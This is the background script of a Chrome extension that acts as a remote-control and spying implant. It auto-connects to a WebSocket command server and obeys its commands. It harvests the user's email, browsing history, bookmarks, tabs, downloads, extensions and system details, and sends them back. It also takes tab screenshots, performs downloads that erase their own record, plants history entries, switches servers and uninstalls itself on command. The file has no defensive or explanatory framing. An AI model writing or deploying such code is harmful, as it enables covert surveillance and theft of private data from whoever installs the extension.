const defaultIp = "10.0.0.67:3000", messageFilter = ["keepAwake"]

function sendMessage(m, toContent) {// str, str, boolean
    if (toContent) chrome.tabs.query({currentWindow: true,active: true}, tabs=>chrome.tabs.sendMessage(tabs[0].id, m).catch(e=>send({type:"response", isError:true, value:e.toString(), responseTarget:m.responseTarget})))
    else chrome.runtime.sendMessage(m).catch(()=>{})
}

function send(obj) {
    ws.send(JSON.stringify(obj))
}

chrome.runtime.onInstalled.addListener(e=>{
    if (e.reason == "install" || e.reason == "update") chrome.storage.local.set({serverAddress:defaultIp, autoConnect:true})
})

chrome.runtime.onMessage.addListener(m => {
    if (m.type == "tryConnectIp") connect(m.value)
    else if (m.type == "getConnectState") chrome.storage.local.get(r=>{sendMessage({type:"connection", value:r.serverAddress})})
    else if (m.type == "response") send(m)
})

function toJSON(str) {
    return JSON.parse(str.replaceAll("'",'"').replaceAll(/['", {]{1}[a-z]+['", ]?:/gi, x=>`${x.match(/^({|,)/g)?.[0]??""}"${x.match(/[a-z0-9]+/gi)}":`))
}

let ws = {}, ws_timeout
chrome.storage.local.get(r=>{
    if (r.autoConnect??true) connect(r.serverAddress??defaultIp)
})

function connect(address) {
    clearTimeout(ws_timeout)
    ws = new WebSocket("ws://"+address)

    ws.onerror=ws.onclose=()=>{
        sendMessage({type:"disconnect"})
        clearTimeout(ws_timeout)
        ws_timeout = setTimeout(()=>{
            chrome.storage.local.get(r=>{
                connect(r.serverAddress)
                console.log("RETRY CONNECTION")
            })
        }, 5000)
    }
    
    ws.onopen=()=>{
        sendMessage({type:"connection", value:address})
        ws.send(JSON.stringify({type:"auth", value:"client"}))

        ws.onmessage = message => {// ON MESSAGE
            let m = JSON.parse(message.data)
            if (!messageFilter.includes(m.type)) console.log(m)//
            if (m.type == "initAuth") {
                ws.id = m.value
            } else if (m.type == "command") commandManager(m)
        }
    } 
}

// COMMANDS
function commandManager(m) {
    let c = m.command.trim().toLowerCase()
    //command action
    try {
        // CONTENT
        if (c == "test" ||
            c.includes("html") ||
            c.includes("clipboard") ||
            c.includes("follow") ||
            c.includes("forcefeed") ||
            c.includes("barrelroll") ||
            c.includes("jumpscare") ||
            c.includes("melt") ||
            c.includes("style")
        ) sendMessage(m, true)
        // BACKGROUND
        else if (c == "getinfo") grabinfo(m.responseTarget)
        else if (c.includes("window")) window(m)
        else if (c == "uninstallself") uninstallself(m)
        else if (c.includes("explorer")) explorer(m)
        else if (c.includes("notif")) notification(m)
        else if (c == "google") google(m)
        else if (c.includes("tab")) tabs(m)
        else if (c == "keepawake") keepawake(m)
        else if (c == "stopkeepawake") stopkeepawake(m)
        else if (c == "changeip") changeip(m)
        else if (c == "download") download(m)
        else if (c == "removedownload") removedownload(m)
        else if (c == "history") historyadd(m)
        else if (c == "capture") capture(m)
    } catch (err) {
        send({type:"response", isError:true, value:err.toString(), responseTarget:m.responseTarget})
    }
}
// - COMMANDS - LIST
// getinfo ()
// Window ({windowinfo})
// uninstallSelf ()
// explorer ()
// notification ({title:"title",message:"message",type:"basic",iconUrl:"./img/void.png", requireInteraction:true, buttons:[{title:"ok"}]}) //
// google (value)
// tabs ()
// keepawake (level) \\ system | display
// stopkeepawake ()
// changeip (newip)
// clipboard
function changeip(m) {
    chrome.storage.local.set({serverAddress:m.value}, ()=>{
        send({type:"response", command:m.command, value:"Ip is now set to: "+m.value, responseTarget:m.responseTarget})
        connect(m.value)
    })
}
function window(m) {//chrome.windows.create({url:"https://www.pointercrate.com/demonlist/",focused:true,height:500,width:500,left:100,top:100,state:"normal",type:"normal"})
    let c = m.command, cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
    if (c.includes("create"))chrome.windows.create(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
    else if (c.includes("current"))chrome.windows.getCurrent(w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
    else if (c.includes("all"))chrome.windows.getAll({}, w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
    else if (c.includes("query"))chrome.windows.getAll(toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
    else if (c.includes("remove"))chrome.windows.remove(id, ()=>send({type:"response", command:m.command, value:"Remove window: "+id, responseTarget:m.responseTarget}))
    else if (c.includes("update"))chrome.windows.update(cid, toJSON(m.value), w=>send({type:"response", command:m.command, value:w, responseTarget:m.responseTarget}))
}
function keepawake(m) {
    chrome.power.requestKeepAwake(m.value)
    send({type:"response", command:m.command, value:"Keeping targeted client's "+m.value+" awake", responseTarget:m.responseTarget})
}
function stopkeepawake(m) {
    chrome.power.releaseKeepAwake()
    send({type:"response", command:m.command, value:"Client's machine is no longer under keepawake", responseTarget:m.responseTarget})
}
function tabs(m) {console.log("TABS: ", m)
    let c = m.command.trim().toLowerCase(), cid = +c.match(/[0-9]+/g)?.[0], id = +m.value
    if (c.includes("active")) chrome.tabs.query({active:true, currentWindow:true}, tabs=>send({type:"response", command:m.command, value:tabs[0], responseTarget:m.responseTarget}))
    else if (c.includes("all")) chrome.tabs.query({}, tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
    else if (c.includes("create")) chrome.tabs.create(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
    else if (c.includes("query")) chrome.tabs.query(toJSON(m.value), tabs=>send({type:"response", command:m.command, value:tabs, responseTarget:m.responseTarget}))
    else if (c.includes("move")) chrome.tabs.move(toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
    else if (c.includes("reload")) chrome.tabs.reload(id, ()=>send({type:"response", command:m.command, value:"Refreshed tab: "+m.value, responseTarget:m.responseTarget}))
    else if (c.includes("remove")) chrome.tabs.remove(id, ()=>send({type:"response", command:m.command, value:"Removed tab: "+m.value, responseTarget:m.responseTarget}))
    else if (c.includes("update")) chrome.tabs.update(cid, toJSON(m.value), t=>send({type:"response", command:m.command, value:t, responseTarget:m.responseTarget}))
    else if (c.includes("high")) chrome.tabs.update(id, {active:true}, ()=>send({type:"response", command:m.command, value:"Higlighted tab: "+m.value, responseTarget:m.responseTarget}))
    else if (c.includes("zoom")) chrome.tabs.setZoom(cid, id, ()=>send({type:"response", command:m.command, value:"Zoom of tab ["+cid+"] set to: "+m.value, responseTarget:m.responseTarget}))
}
function uninstallself(m) {
    send({type:"response", command:m.command, value:"TERMINATED", responseTarget:m.responseTarget})
    chrome.management.uninstallSelf()
}
function explorer(m) {// EXPAND~
    chrome.downloads.showDefaultFolder()
    send({type:"response", command:m.command, value:"Opened Explorer", responseTarget:m.responseTarget})
}
function notification(m) {// EXPAND
    let c = m.command.trim().toLowerCase()
    if (c.includes("create")) chrome.notifications.create(toJSON(m.value), nId=>send({type:"response", command:m.command, value:nId, responseTarget:m.responseTarget}))
    else if (c.includes("all")) chrome.notifications.getAll(all=>send({type:"response", command:m.command, value:all, responseTarget:m.responseTarget}))
    else if (c.includes("clear")) chrome.notifications.clear(m.value, c=>send({type:"response", command:m.command, value:"successfully cleared notification: "+c, responseTarget:m.responseTarget}))
    else send({type:"response", command:m.command, value:"Invalid command or missing parameter", responseTarget:m.responseTarget})
 // clear all instead of clear TODO
}
function historyadd(m) {
    chrome.history.addUrl({url:m.value}, ()=>send({type:"response", command:m.command, value:"Added: '"+m.value+"' to history", responseTarget:m.responseTarget}))
}
function google(m) {
    chrome.search.query({text:m.value})
    send({type:"response", command:m.command, value:"Google searched: "+m.value, responseTarget:m.responseTarget})
}
function download(m) {
    let c = m.command.trim().toLowerCase(), v = toJSON(m)
    if (c.includes("hid")) chrome.downloads.download(v, id=>{
        chrome.downloads.erase({id:id})
        send({type:"response", command:m.command, value:"(H) Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget})
    })
    else chrome.downloads.download(v, id=>send({type:"response", command:m.command, value:"Downloaded: "+v.filename+" (id:"+id+")", responseTarget:m.responseTarget}))
}
function removedownload(m) {
    chrome.downloads.download(+m.value, ()=>send({type:"response", command:m.command, value:"Removed download: "+m.value, responseTarget:m.responseTarget}))
}
function capture(m) {
    chrome.tabs.captureVisibleTab(data=>send({type:"response", command:m.command, isImg:true, clientId:ws.id, value:data, responseTarget:m.responseTarget}))
}
function grabinfo(responseTarget) {
    let info = {navigator_language:navigator.language}, info_cd=0
    function sendInfo() {
        info_cd++
        if (info_cd == 11) send({type:"response", value:info, responseTarget:responseTarget, command:m.command})
    }

    chrome.identity.getProfileUserInfo((e)=>{
        info.email = e.email
        sendInfo()
    })

    chrome.tabs.query({}, tabs=>{
        info.tabs = tabs
        sendInfo()
    })

    chrome.tabs.query({active:true}, tab=>{
        info.active_tab = tab
        sendInfo()
    })

    chrome.bookmarks.getTree(tree=>{
        info.bookmarks = tree
        sendInfo()
    })

    chrome.management.getAll(exts=>{
        info.installed_extensions = exts.map(e=>e.name).join(",\n")
        sendInfo()
    })

    chrome.system.cpu.getInfo(cpu=>{
        info.cpu = cpu
        sendInfo()
    })

    chrome.system.storage.getInfo(r=>{
        info.storage = r
        sendInfo()
    })

    chrome.system.display.getInfo(r=>{
        info.display = r
        sendInfo()
    })

    chrome.downloads.search({}, (downloads)=>{
        info.downloads = downloads//.map(d=>({size: d.fileSize, date:d.endTime, exists:d.exists, mime:d.mime, filename:d.filename, url:d.url}))
        sendInfo()
    })
    
    chrome.readingList.query({}, (tabs)=>{
        info.readingList = tabs
        sendInfo()
    })

    chrome.history.search({text:""}, h=>{
        info.history = h
        sendInfo()
    })
}